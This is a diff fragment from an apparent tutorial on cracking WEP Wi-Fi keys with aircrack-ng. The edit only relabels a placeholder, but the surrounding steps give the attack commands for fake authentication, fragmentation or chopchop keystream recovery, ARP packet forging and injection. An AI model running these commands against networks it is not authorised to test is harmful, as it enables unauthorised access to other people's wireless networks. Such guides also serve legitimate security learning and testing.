@@ -29,16 +29,16 @@ sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wla
 ```
 4. Do a fake authentication
 ```
-aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr (STATION)> wlan0mon
+aireplay-ng -1 0 -e <wifi name(ssid)> -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
 ```
 5. If no client then do a fragmentation attack (-5) and obtain the Keystream file (If fragmentation not success then use Chopchop technique -4)
 ```
-aireplay-ng -5 -b <bssid of the AP> -h <wireless card MAC addr (STATION)> wlan0mon    
+aireplay-ng -5 -b <bssid of the AP> -h <wireless card MAC addr> wlan0mon    
 ```
 6. Then the Keystream file (.xor) is obtained
 7. Create ARP packet
 ```
-packetforge-ng -0 -a <bssid of the AP> -h <wireless card MAC addr (STATION)> -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor(Keystream file) -w arp-request
+packetforge-ng -0 -a <bssid of the AP> -h <wireless card MAC addr> -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor(Keystream file) -w arp-request
 ```
 8. Inject the forged ARP packet
 ```
